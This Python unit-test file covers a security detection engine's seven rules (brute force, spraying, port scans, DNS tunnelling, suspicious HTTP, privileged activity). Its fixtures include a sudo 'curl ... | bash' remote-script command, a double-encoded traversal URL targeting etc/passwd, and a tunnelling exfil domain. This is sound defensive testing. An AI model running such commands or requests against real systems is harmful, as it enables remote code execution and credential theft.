"""Unit tests for all 7 detection rules, window boundaries, allowlists and benign baseline."""

from __future__ import annotations

from datetime import timedelta

from app.detection.base import RuleConfig
from app.detection.engine import evaluate_pure
from app.detection.rules import (
    MultipleFailedLoginsRule,
    PasswordSprayingRule,
    PortScanningRule,
    PrivilegedActivityRule,
    SshBruteForceRule,
    SuspiciousDnsRule,
    SuspiciousHttpRule,
)
from app.domain.enums import EventOutcome, EventType, Severity
from app.simulation.scenarios import generate_scenario_events
from tests.factories import BASE_TIME, make_event

# ---------------------------------------------------------------------------
# 1. SENT-AUTH-001 — SSH Brute Force
# ---------------------------------------------------------------------------


def test_ssh_brute_force_true_positive_and_escalation() -> None:
    rule = SshBruteForceRule()
    cfg = RuleConfig.from_metadata(rule.metadata)

    events = [
        make_event(
            timestamp=BASE_TIME + timedelta(seconds=i * 10),
            source_ip="203.0.113.9",
            username="root",
            seq=i,
        )
        for i in range(10)
    ]
    findings = rule.evaluate(events, cfg)
    assert len(findings) == 1
    assert findings[0].severity == Severity.HIGH
    assert findings[0].evidence["failed_attempt_count"] == 10

    # Add a subsequent SSH login success -> escalates to CRITICAL
    events.append(
        make_event(
            timestamp=BASE_TIME + timedelta(seconds=110),
            source_ip="203.0.113.9",
            username="root",
            event_outcome=EventOutcome.SUCCESS,
            seq=99,
        )
    )
    escalated = rule.evaluate(events, cfg)
    assert len(escalated) == 1
    assert escalated[0].severity == Severity.CRITICAL
    assert escalated[0].evidence["compromise_suspected"] is True


def test_ssh_brute_force_window_boundary_allowlist_and_disabled() -> None:
    rule = SshBruteForceRule()
    cfg = RuleConfig.from_metadata(rule.metadata)  # threshold=10, window=300s

    # Exactly 300s span (0s..300s) -> triggers
    exact_300 = [
        make_event(
            timestamp=BASE_TIME + timedelta(seconds=(300 * i) / 9),
            source_ip="203.0.113.11",
            seq=i,
        )
        for i in range(10)
    ]
    assert len(rule.evaluate(exact_300, cfg)) == 1

    # 301s span (first at 0s, 10th at 301s, no 10 events fit in 300s) -> no alert
    outside_301 = [
        make_event(timestamp=BASE_TIME + timedelta(seconds=i * 34), source_ip="203.0.113.12", seq=i)
        for i in range(10)
    ]
    assert rule.evaluate(outside_301, cfg) == []

    # 5 failures each from 2 different IPs -> no alert
    split_ips = [
        make_event(
            timestamp=BASE_TIME + timedelta(seconds=i),
            source_ip="203.0.113.1" if i < 5 else "203.0.113.2",
            seq=i,
        )
        for i in range(10)
    ]
    assert rule.evaluate(split_ips, cfg) == []

    # Allowlisted CIDR suppresses finding
    allow_cfg = RuleConfig(
        enabled=True,
        severity=Severity.HIGH,
        threshold=10,
        time_window_seconds=300,
        parameters={"allowlist_ips": ["203.0.113.0/24"]},
    )
    assert rule.evaluate(exact_300, allow_cfg) == []

    # Disabled rule
    disabled_cfg = RuleConfig(
        enabled=False, severity=Severity.HIGH, threshold=10, time_window_seconds=300
    )
    assert rule.evaluate(exact_300, disabled_cfg) == []


# ---------------------------------------------------------------------------
# 2. SENT-AUTH-002 — Password Spraying
# ---------------------------------------------------------------------------


def test_password_spraying_distinguishes_spray_from_brute_force() -> None:
    rule = PasswordSprayingRule()
    cfg = RuleConfig.from_metadata(rule.metadata)  # >=5 users, <=3.0 avg attempts/user

    spray_events = [
        make_event(
            timestamp=BASE_TIME + timedelta(seconds=i * 20),
            source_ip="198.51.100.20",
            username=f"user{i}",
            seq=i,
        )
        for i in range(6)
    ]
    findings = rule.evaluate(spray_events, cfg)
    assert len(findings) == 1
    assert findings[0].evidence["distinct_usernames_count"] == 6

    # Heavy brute force (5 users * 5 attempts each = avg 5.0 > 3.0) -> not password spraying
    heavy_events = [
        make_event(
            timestamp=BASE_TIME + timedelta(seconds=i),
            source_ip="198.51.100.21",
            username=f"user{i % 5}",
            seq=i,
        )
        for i in range(25)
    ]
    assert rule.evaluate(heavy_events, cfg) == []


# ---------------------------------------------------------------------------
# 3. SENT-AUTH-003 — Multiple Failed Logins (Single Account)
# ---------------------------------------------------------------------------


def test_multiple_failed_logins_single_and_distributed_escalation() -> None:
    rule = MultipleFailedLoginsRule()
    cfg = RuleConfig.from_metadata(rule.metadata)  # threshold=5, distributed>=3 IPs

    distributed_events = [
        make_event(
            timestamp=BASE_TIME + timedelta(seconds=i * 15),
            source_ip=f"203.0.113.{10 + i}",
            username="alice",
            seq=i,
        )
        for i in range(5)
    ]
    findings = rule.evaluate(distributed_events, cfg)
    assert len(findings) == 1
    assert findings[0].severity == Severity.HIGH
    assert findings[0].evidence["distributed_attack"] is True


# ---------------------------------------------------------------------------
# 4. SENT-NET-001 — Port Scanning
# ---------------------------------------------------------------------------


def test_port_scanning_vertical_and_horizontal() -> None:
    rule = PortScanningRule()
    cfg = RuleConfig.from_metadata(rule.metadata)  # threshold=20 ports in 60s

    vertical_events = [
        make_event(
            timestamp=BASE_TIME + timedelta(seconds=i),
            event_type=EventType.FIREWALL,
            event_action="firewall_block",
            source_ip="192.0.2.50",
            destination_ip="10.0.1.10",
            destination_port=1000 + i,
            protocol="tcp",
            seq=i,
        )
        for i in range(22)
    ]
    findings = rule.evaluate(vertical_events, cfg)
    assert len(findings) == 1
    assert findings[0].evidence["scan_type"] == "vertical"
    assert findings[0].evidence["distinct_ports_count"] == 22

    # 22 packets to the SAME port is not a port scan
    same_port = [
        make_event(
            timestamp=BASE_TIME + timedelta(seconds=i),
            event_type=EventType.FIREWALL,
            source_ip="192.0.2.51",
            destination_ip="10.0.1.10",
            destination_port=443,
            seq=i,
        )
        for i in range(22)
    ]
    assert rule.evaluate(same_port, cfg) == []


# ---------------------------------------------------------------------------
# 5. SENT-DNS-001 — Suspicious DNS Activity
# ---------------------------------------------------------------------------


def test_suspicious_dns_entropy_length_and_domain_allowlist() -> None:
    rule = SuspiciousDnsRule()
    cfg = RuleConfig.from_metadata(rule.metadata)

    tunnel_ev = make_event(
        event_type=EventType.DNS_QUERY,
        event_action="dns_query",
        event_outcome=EventOutcome.SUCCESS,
        source_ip="10.0.2.55",
        fields={
            "dns.question.name": "k9x2m8p4q7w1z6n3v5b8c0f2h4j6l8r1t3y5u7.exfil.example.test",
            "dns.question.type": "TXT",
        },
    )
    findings = rule.evaluate([tunnel_ev], cfg)
    assert len(findings) == 1
    assert "high_entropy_subdomain" in findings[0].evidence["indicators"]

    # Allowlisted cloudfront.net domain must NOT alert even with long subdomain
    cdn_ev = make_event(
        event_type=EventType.DNS_QUERY,
        event_action="dns_query",
        event_outcome=EventOutcome.SUCCESS,
        source_ip="10.0.2.55",
        fields={
            "dns.question.name": "d111111abcdef8.cloudfront.net",
            "dns.question.type": "A",
        },
    )
    assert rule.evaluate([cdn_ev], cfg) == []


# ---------------------------------------------------------------------------
# 6. SENT-WEB-001 — Suspicious HTTP Activity
# ---------------------------------------------------------------------------


def test_suspicious_http_double_encoded_traversal_and_404_burst() -> None:
    rule = SuspiciousHttpRule()
    cfg = RuleConfig.from_metadata(rule.metadata)

    ev = make_event(
        event_type=EventType.HTTP_REQUEST,
        event_action="http_request",
        event_outcome=EventOutcome.SUCCESS,
        source_ip="203.0.113.77",
        fields={
            "http.request.method": "GET",
            "url.original": "/download?f=%252e%252e%252fetc/passwd",
            "url.path": "/download",
            "http.response.status_code": 200,
            "user_agent.original": "sqlmap/1.8",
        },
    )
    findings = rule.evaluate([ev], cfg)
    assert len(findings) == 1
    assert findings[0].severity == Severity.CRITICAL
    assert "directory_traversal" in findings[0].evidence["indicators"]
    assert "scanner_user_agent" in findings[0].evidence["indicators"]


# ---------------------------------------------------------------------------
# 7. SENT-PRIV-001 — Unusual Privileged Activity
# ---------------------------------------------------------------------------


def test_privileged_activity_unauthorized_sudo_and_authorized_benign() -> None:
    rule = PrivilegedActivityRule()
    cfg = RuleConfig.from_metadata(rule.metadata)

    # Authorised admin running benign status command -> no finding
    benign_admin = make_event(
        event_type=EventType.PROCESS_EXECUTION,
        event_action="sudo",
        event_outcome=EventOutcome.SUCCESS,
        username="admin",
        fields={"process.command_line": "/usr/bin/systemctl status nginx"},
    )
    assert rule.evaluate([benign_admin], cfg) == []

    # Unauthorised user running shadow read + curl|bash -> CRITICAL finding
    malicious = make_event(
        event_type=EventType.PROCESS_EXECUTION,
        event_action="sudo",
        event_outcome=EventOutcome.SUCCESS,
        username="intern01",
        fields={"process.command_line": "curl -s http://198.51.100.1/x.sh | bash"},
    )
    findings = rule.evaluate([malicious], cfg)
    assert len(findings) == 1
    assert findings[0].severity == Severity.CRITICAL
    assert "unauthorized_user_elevation" in findings[0].evidence["triggered_conditions"]
    assert "remote_script_execution" in findings[0].evidence["triggered_conditions"]


# ---------------------------------------------------------------------------
# 8. Benign Baseline Regression Test (normal_activity -> 0 findings)
# ---------------------------------------------------------------------------


def test_normal_activity_scenario_triggers_zero_rules() -> None:
    _, _, normal_events = generate_scenario_events("normal_activity", seed=1001)
    assert len(normal_events) >= 15
    findings = evaluate_pure(normal_events)
    assert findings == []
